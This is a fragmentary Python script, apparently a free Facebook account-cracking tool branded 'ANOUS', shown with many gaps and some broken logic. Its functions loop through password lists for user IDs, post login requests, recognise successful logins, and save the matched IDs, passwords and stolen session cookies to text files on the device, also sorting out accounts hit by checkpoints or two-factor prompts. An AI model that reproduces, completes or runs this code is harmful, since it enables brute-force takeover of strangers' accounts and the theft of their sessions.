...
logo=("""\033[1;37m
 .d8b.  d8b   db  .d88b.  db    db .d8888.      
d8' `8b 888o  88 .8P  Y8. 88    88 88'  YP      
88ooo88 88V8o 88 88    88 88    88 `8bo.        
88~~~88 88 V8o88 88    88 88    88   `Y8b.      
88   88 88  V888 `8b  d8' 88b  d88 db   8D      
YP   YP VP   V8P  `Y88P'  ~Y8888P' `8888Y'                                                                                                    
----------------------------------------------
 Author    : A N O U S
 Status    : F R E E
 Version   : 0.7 \033[1;37m
 Github  :    A N O U S
----------------------------------------------""")
def linex():
    print('\033[1;37m----------------------------------------------')
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [ANOUS] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/ANOUS-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANOUS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[2FACTOR] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/ANOUS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
...
'Content-Length': '706'}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SUCESSFUL] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SUCEASFUL] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ANOUS-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANOUS-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [CHECKPOINT] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ANOUS-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ANOUS-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANOUS-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
